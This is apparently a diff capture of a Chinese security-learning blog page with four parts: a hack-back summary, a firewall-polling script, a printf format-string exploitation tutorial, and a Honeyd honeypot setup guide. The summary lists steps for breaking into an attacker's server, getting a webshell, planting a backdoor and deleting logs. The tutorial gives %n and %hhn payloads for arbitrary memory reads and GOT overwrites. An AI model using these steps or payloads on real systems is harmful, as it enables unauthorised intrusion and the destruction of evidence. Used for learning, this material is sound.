-<p>五、总结一下学到的朔源：</p>
-<p>1.首先得到ip，先挂clash和proxifier全局代理安排上。</p>
-<p>2.IPIP.net  ip138.com等查该ip下面绑了啥域名，对应开了什么web服务。</p>
-<p>3.先Ping一下IP绑定的域名，看看最终的web服务是不是挂在该IP下。然后拿目录扫描器开始扫这个ip开的web服务，需要字典和工具。</p>
-<p>4.根据扫描结果或经验，尝试看看能不能找到后台管理的登录页面，先尝试一波弱口令，SQL注入什么的。</p>
-<p>5.现在就可以尝试分析这个Web服务的CMS架构，找出来之后就可以找对应版本漏洞打打试试，尝试拿Webshell。</p>
-<p>6.经过艰苦不懈的尝试，再加上运气，可能就能拿Webshell了。这时候进入他的Web服务中，尝试提权什么的，一句话木马，各种小工具啥的上就完了。</p>
-<p>7.搞了一堆也不太好使的话，那就可能要被发现了，这时候不要慌，走之前删一删Web服务上无关紧要的小图片，小链接什么的，然后尝试删记录退出啥的。</p>
-<p>8.哎，这时候就可以打个游戏，吃个饭，睡个觉，第二天再来尝试看看，如果运气好没被堵上漏洞，那就看看日志，这兄弟的一些恢复操作就能完整被我们知道，然后根据这些日志来找账户密码，或者是一些系统操作调用啥的，方便我们拿到更高级的权限。</p>
-<p>9.运气再好些拿到高权限的shell后，种个后门木马就跑路呗，记得删日志。</p>
-<p>(像那种挂了很多域名，提供了看似正常的Web服务的，有很大可能是个用来翻墙洗白流量的服务器，这种服务器一般比较好拿权限，因为使用者一般挂完服务后都不会再投入过多精力去管的)</p>
-<p>▲CMS啥的常规不管用，就扫端口，尝试端口服务漏洞直接爆破，再牛逼点，使用0day打。再再牛逼点，直接现场挖对应版本服务的漏洞(pwn大佬干的活)。</p>
-<p>▲再补一下护网对USG写的脚本，是同学写的，版权在他那里，特此声明。本来自己想写另一个解析HTML的脚本却怎么也不成功，水平还是太差：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">import json</span><br><span class="line">import winsound</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">url = &quot;https://10.10.10.1/=========================&quot;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;application/json, text/javascript, */*; q=0.01&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;,</span><br><span class="line">    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,</span><br><span class="line">    &quot;Connection&quot;: &quot;keep-alive&quot;,</span><br><span class="line">    &quot;Cookie&quot;: &quot;=======================================&quot;,</span><br><span class="line">    &quot;Host&quot;: &quot;10.10.10.1&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Dest&quot;: &quot;document&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Mode&quot;: &quot;navigate&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Site&quot;: &quot;none&quot;,</span><br><span class="line">    &quot;Sec-Fetch-User&quot;: &quot;?1&quot;,</span><br><span class="line">    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;========================================&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">recorded_ips = set()</span><br><span class="line"></span><br><span class="line">with open(&quot;blacklistips.txt&quot;, &quot;r&quot;) as f:</span><br><span class="line">    recorded_ips = set(f.read().splitlines())</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        print(time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime(time.time())))</span><br><span class="line"></span><br><span class="line">        doc = requests.get(url=url, headers=headers, verify=False)</span><br><span class="line"></span><br><span class="line">        if doc.status_code != 200:</span><br><span class="line">            winsound.Beep(2000, 2000)</span><br><span class="line">            print(&quot;无法访问&quot;)</span><br><span class="line">            time.sleep(10)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        json_dict = json.loads(doc.text)</span><br><span class="line">        data = json_dict[&quot;data&quot;]</span><br><span class="line">        for attack in data:</span><br><span class="line">            ip = attack[&quot;name&quot;]</span><br><span class="line">            hasRisk = (</span><br><span class="line">                int(attack[&quot;middle&quot;]) &gt; 0</span><br><span class="line">                or int(attack[&quot;high&quot;]) &gt; 0</span><br><span class="line">                or int(attack[&quot;critical&quot;]) &gt; 0</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            if not hasRisk:</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            if ip in recorded_ips:</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            print(attack)</span><br><span class="line">            winsound.Beep(2000, 2000)</span><br><span class="line">            recorded_ips.add(ip)</span><br><span class="line"></span><br><span class="line">        with open(&quot;blacklistips.txt&quot;, &quot;w&quot;) as f:</span><br><span class="line">            for data in recorded_ips:</span><br><span class="line">                f.write(data + &quot;\n&quot;)</span><br><span class="line">        print(&quot;平平安安&quot;)</span><br><span class="line">        time.sleep(30)</span><br><span class="line"></span><br><span class="line">    except Exception as err:</span><br><span class="line">        print(err)</span><br><span class="line">        winsound.Beep(2000, 2000)</span><br><span class="line">        time.sleep(10)</span><br></pre></td></tr></table></div></figure>
-
-<p>▲最后做个总结，学了这些天下来，感觉Web太杂太乱，边边角角太多，而且更新速度极快，可能过个一两个月就过时的，实在是不适合像我这种又蠢又懒，脑容量又小的菜鸡去搞。</p>
-<p>还是感觉现在深入搞Web不到时候，在校期间更适合学些基础理论的东西，所以之后还是回老本行搞二进制去吧，起码这些理论知识更新换代比较慢一点。并且这种更新更像是一种基于理论来千变万化的，而不像Web好多都是那种一更新就完全变成新东西，没多少理论依据可言，直接就是开脑洞的。</p>
-<p>还是搞二进制去吧，黑客的理想还是等以后工作了再来。</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6printf%E6%B1%87%E6%80%BB/">格式化字符printf汇总</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>▲printf的性质：</p>
-<p>▲参数%s：这个参数其本质上是读取对应的参数，并作为指针解析，获取到对应地址的字符串输出。可以通过这个性质来泄露某个内存地址的内容：</p>
-<p>例子：</p>
-<p>如果输入一个%S，在调用printf之前，栈上会是这种数据，有两个相同的指向%S，一个是会解析成参数%S，一个会使用解析的参数%S作用来打印输入的%S。这里可以计算出偏移量为6，即从栈顶数第6个可以到达我们输入的内容0x0a7325。</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191542914.png" alt="img"></p>
-<p>1.泄露任意地址内容</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">\x01\x80\x04\x08%x.%x.%x.%x.%s</span><br></pre></td></tr></table></div></figure>
-
-<p>这一段即打印从栈顶往下数5个内容的栈中保存的值，由于第5个参数是%s，所以会将第5个内容当作一个地址来解析，从而打印位于该地址上的值。所以输出应该为0xff95abb4,0x0000012B,0x08048465…..(这都是栈上的内存),最后第五个内容是0x08040801，用参数%s来解析，即打印该地址上保存的内容，地址对应的值为”ELF\x01\x01\x01\n”，这样就可以打印任意内存地址的值。常用来传入got表地址，然后借助该函数泄露某函数got表中的值，即是泄露该函数的真实地址。</p>
-<p>▲简化使用：</p>
-<p>如果输入的参数保存在栈上很远的位置，那么则需要叠加%x，但是实际中可以使用简单的偏移来打印：\x01\x80\x04\x08%5$s，其中5就代表从esp开始计算偏移量为6。</p>
-<p>总的来说就是一个公式，输出偏移量为n的参数的值就是：</p>
-<p>%(n-1)$s</p>
-<p>(%[addr_offset_value]$[格式化控制字符])</p>
-<p>2.任意地址可写：</p>
-<p>特殊格式化字符%n家族：</p>
-<p>(1)这个字符会将已经输出的字符数写入到指定内存中，例如\x8c\x97\x04\x08%[addr_offset_value]$n，这段格式化字符串会使得地址0x0804978c处的内容变成4，因为这代表了输出了\x8c\x97\x04\x08这四个字符，所以会向0x0804978c这个地址写入4，实际是写入00 00 00 04，共计四个字节。利用这个特性可以修改某个地址的值。</p>
-<p>(2)\x8c\x97\x04\x08%2048c%(addr_offset_value)$n：这个代码会将2052，实际是(00 00 08 04) ，共计四个字节写入到地址0x0804978c，因为调用了printf会先打印\x8c\x97\x04\x08四个字符，然后依据格式化字符%2048c，再打印2048个空字符，实际打印了2048+4=2052个字符，对应16进制为0x804，所以在使用是需要减去在%这个格式化字符标志前的字符的个数才是对应的值。</p>
-<p>(3)但是在实际中，如果我们想将一个地址的值写入到某个地址，使得可以调用，那么我们需要输入的就会变成0x8xxx….转换成十进制则会特别大，会向服务器发送0x8000…个字符，这在实际中很容易出错。这时候需要用到另一个格式化字符控制：%hhn。</p>
-<p>(4)特殊格式化字符%hhn：这个字符可以使得一次往指定地址写入一个字节。所以我们可以将我们需要输入的地址给拆分成4个字节来输入。</p>
-<p>(5)例如</p>
-<p>\x78\x97\x04\x08\x79\x97\x04\x08\x7a\x97\x04\x08\x7b\x97\x04\x08%16c%5$hhn%99c%6$hhn%129c%7$hhn%4c%8$hhn</p>
-<p>这个格式化字符串相当于四个操作：</p>
-<p>①\x78\x97\x04\x08%16c%5$hhn：改变地址0x08049778的值为0x20。</p>
-<p>这里是20是因为前面已经输出了\x78\x97\x04\x08\x79\x97\x04\x08\x7a\x97\x04\x08\x7b\x97\x04\x08总共16个字符，所以实际写入到地址0x08049778的值为16+16=32=0x20。</p>
-<p>②\x79\x97\x04\x08%99c%6$hhn:改变地址0x08049779的值为99+32=131=0x83，同理，因为前面已经输出了32个字符，所以最终写入值为0x83。</p>
-<p>③\x7a\x97\x04\x08%129c%7$hhn：改变地址0x0804977a的值为129+131=260=0x104，这里由于是使用%hhn，所以只能写入一个字符，也就是会被截断为0x04</p>
-<p>④\x7b\x97\x04\x08%4c%8$hhn：改变地址0x0804977b的值为4+0x104=0x108=0x08。所以最终写入到地址0x08049778中的四个字节为0x08048320，完成写入地址。</p>
-<p>总的公式:</p>
-<p>[addr]%[padding_count]c%[addr_offset_value]$[格式化控制字符]</p>
-<p>▲注意偏移量一直在递增。还有就是因为这是大端存储，所以写入的顺序需要计算一下，防止出现\x00导致字符串输入截断。</p>
-<p>▲特殊格式化字符串调用类：Fmtstr</p>
-<p>以上的可以直接改成：fmtstr_payload(5, {printf_got_addr:system_plt})将栈上偏移量为6的值改成printf_got_addr，同样将printf_got_addr的值修改为system_plt_addr。也就是在第一次用pringtf时，会修改栈和劫持printf_got_addr为system_plt_addr。下一次再调用printf时，从printf_got_addr指向的就会是system_plt_addr，完成劫持。</p>
-<p>但是如果一旦printf_got_addr出现\x00或者不同输入函数所对应的非法字符，就会发生截断，导致出错。因为Fmtstr模块创造的payload中地址会被切割成几段，相当于我们的多段执行，那么最后的几个地址如果其中一个带了非法字符就会出错。</p>
-<p>▲printf函数的格式化字符串常见有</p>
-<p>(1)%d，%f，%c，%s，（用于读取内存数据）</p>
-<p>(2)%x（输出16进制数，前面没有0x），%p（输出16进制数，前面带有0x）</p>
-<p>(3)除了%n，%hn，%hhn，%lln，分别对应写入目标空间4字节，2字节，1字节，8字节。</p>
-<p>▲由于使用%n之类的控制字符，输入的str(addr)为以字符串形式输入，也就是说会转换成十进制然后转换成对应的ascii码来存储在栈上，所以不会出现0x00这类的字符。但是如果是需要写入的地址，使用的是p64或者p32，这个就是直接对应的，如果这个地址中有00，那么就不会被read函数读取进入。因为read函数默认结尾是0x00，也就是字符串结束符号。所以这种情况下一般都是将p64(addr)放在payload的末尾，从而自动生成00，不会导致被截断。</p>
-<p>★技巧总结:</p>
-<p>1.劫持某函数为system函数时，是将Got表劫持为plt表，并且该函数的总体结构应该与system函数类似，参数应该是一个地址。</p>
-<p>2.fmtstr模块的用法需要注意，有时候也不太好用。</p>
-<p>参考资料：</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/%E8%9C%9C%E7%BD%90%E6%90%AD%E5%BB%BA/">蜜罐搭建</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>环境：虚拟机ubuntu18.04。</p>
-<p>1.安装前置依赖：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install g++ gcc</span><br><span class="line">sudo apt-get install flex</span><br><span class="line">sudo apt-get install bison</span><br><span class="line">sudo apt-get install libedit-dev</span><br></pre></td></tr></table></div></figure>
-
-<p>2.下载前置工具：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line">libevent-1.4.14b-stable.tar.gz   </span><br><span class="line">libdnet-1.11.tar.gz              </span><br><span class="line">libpcap-1.1.1.tar.gz             </span><br><span class="line">arpd-0.2.tar.gz</span><br><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">http://libevent.org/</span><br><span class="line">http://libdnet.sourceforge.net/</span><br><span class="line">http://www.tcpdump.org/release/</span><br><span class="line">http://www.citi.umich.edu/u/provos/honeyd</span><br></pre></td></tr></table></div></figure>
-
-<p>3.安装工具：基本都是编译三部曲</p>
-<p>(1)安装Libevent(非同步事件通知的函数库)：使用libevent，可以设定某些事件发生时所执行的函数，用来代替程序所使用的循环检查。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">sudo tar -zxvf libevent-1.4.14b-stable.tar.gz</span><br><span class="line">cd libevent-1.4.14b-stable</span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></div></figure>
-
-<p>(2)安装Libdnet(提供跨平台的网络相关的API函数库)：包括了ARP缓存，路由表查询，IP包及物理帧的传输等。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">sudo tar -zxvf libdnet-1.11.tar.gz</span><br><span class="line">cd libdnet-1.11</span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></div></figure>
-
-<p>(3)安装Libpcap：一个数据包捕获函数库，大多数网络软件都以它为基础</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">sudo tar -zxvf libpcap-1.1.1.tar.gz</span><br><span class="line">cd libpcap-1.1.1</span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></div></figure>
-
-<p>之前装的依赖 flex bison就是为了这个。</p>
-<p>(4)安装ARPD（运行在与Honeyd相同的系统上）：arpd是honeyd众多协作工具中最重要的一个工具。工作时监听局域网内的流量，并通过查看honeyd系统的ARP表判断其他系统是否存活。在蜜罐系统中arpd可以指定IP地址，将该系统下的MAC地址伪装成指定IP的MAC地址，这样对指定IP地址范围内未使用的IP的连接访问都被重定向到蜜罐主机，然后对蜜罐主机进行相关的设置，就可以诱导攻击，截取流量。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">sudo tar -zxvf arpd-0.2.tar.gz</span><br><span class="line">cd arpd-0.2</span><br><span class="line">sudo ./configure</span><br><span class="line">#报错：error：expected’)’ before string constant</span><br><span class="line">#解决：在arpd.c文件中添加#define __FUNCTION__ &quot;&quot; #vim arpd.c添加定义</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></div></figure>
-
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452748.png" alt="img"></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452811.png" alt="img"></p>
-<p>4.安装蜜罐工具Honeyd：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">sudo tar -zxvf honeyd-1.5c.tar.gz</span><br><span class="line">cd honeyd-1.5c</span><br><span class="line">sudo ./configure</span><br><span class="line">#报错：configure: error: Couldn&#x27;t figure out how to access libc</span><br><span class="line">#解决：sudo ln -s /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/libc.so</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></div></figure>
-
-<p>5.先将arpd运行起来：</p>
-<p>(1)运行后显示链接不存在：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452140.png" alt="img"></p>
-<p>(2)解决办法：找到libevent-1.4.so.2的位置，然后将位置加到定位的文件中</p>
-<p>whereis libevent-1.4.so.2</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452134.png" alt="img"></p>
-<p>sudo vim /etc/ld.so.conf</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452265.png" alt="img"></p>
-<p>sudo ldconfig #重新加载链接</p>
-<p>(3)之后选定网卡，即可模拟IP，伪装IP的MAC地址</p>
-<p>sudo arpd -i ens33 192.168.1.71</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452193.png" alt="img"></p>
-<p>▲这里的ens33是ubuntu下用ip addr查到的，不同系统可能不同。</p>
-<p>6.检测Honeyd是否可以运行：</p>
-<p>(1)设置启动参数vim honeyd.conf：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"># Example of a simple host template and its binding</span><br><span class="line">create windows</span><br><span class="line"></span><br><span class="line">#创建一个windows xp系统的蜜罐</span><br><span class="line">set windows personality &quot;Microsoft Windows XP Professional SP1&quot;</span><br><span class="line"></span><br><span class="line">#开启80端口web服务且侦听脚本为honeyd-1.5c/scripts/web.sh</span><br><span class="line">add windows tcp port 80 &quot;sh /home/hacker/Desktop/Web/Honey/honeyd-    1.5c/scripts/web.sh&quot;</span><br><span class="line"></span><br><span class="line">#关闭默认的tcp,udp连接</span><br><span class="line">set windows default tcp action reset</span><br><span class="line">set windows default udp action reset</span><br><span class="line"></span><br><span class="line">#将windows这个蜜罐的ip绑定为192.168.40.150</span><br><span class="line">bind 192.168.40.150 windows</span><br></pre></td></tr></table></div></figure>
-
-<p>▲注意这里面设置的IP是在局域网下的，且还没有被DHCP分配出去的可用IP。同时设置了该IP主机下的80端口，这样其他用户在访问该IP的80端口时就会运行(Web访问)</p>
-<p>sh /home/hacker/Desktop/Web/Honey/honeyd- 1.5c/scripts/web.sh</p>
-<p>这条命令，然后返回相应的信息。</p>
-<p>(2)设置web.sh脚本(这可以随便设置，制作一个web前端即可，常用来钓鱼)，在honeyd.conf中设置路径：在scripts下原本存在一个自带的脚本，该脚本被其他人访问运行成功后呈现如下：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452534.png" alt="img"></p>
-<p>(3)启动蜜罐honeyd：</p>
-<p>honeyd -d -f honeyd.conf 192.168.1.2</p>
-<p>▲这样一个蜜罐就搭建起来了，需要注意的是搭建步骤大概分为以下几步：</p>
-<p>①利用arpd虚拟IP。</p>
-<p>②在honey的启动参数中，也就是honey.conf中绑定虚拟的主机到虚拟IP。</p>
-<p>③在honey.conf中设置虚拟主机的相关端口，协议等参数。</p>
-<p>④设置端口连接后的返回信息，类似于80端口的web.sh，或者ssh连接端口的页面等等。</p>
-<p>⑤启动honey，等待鱼儿上钩。</p>
-<p>参考资料：</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/12/17/5df842503e7a9/" >https://www.dazhuanlan.com/2019/12/17/5df842503e7a9/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/accepthjp/article/details/46399715" >https://blog.csdn.net/accepthjp/article/details/46399715</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/zhangxuechao_/article/details/80261502" >https://blog.csdn.net/zhangxuechao_/article/details/80261502</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/8/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/10/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">96</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">42</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">43</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/8/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/10/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">101</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">44</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">45</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas 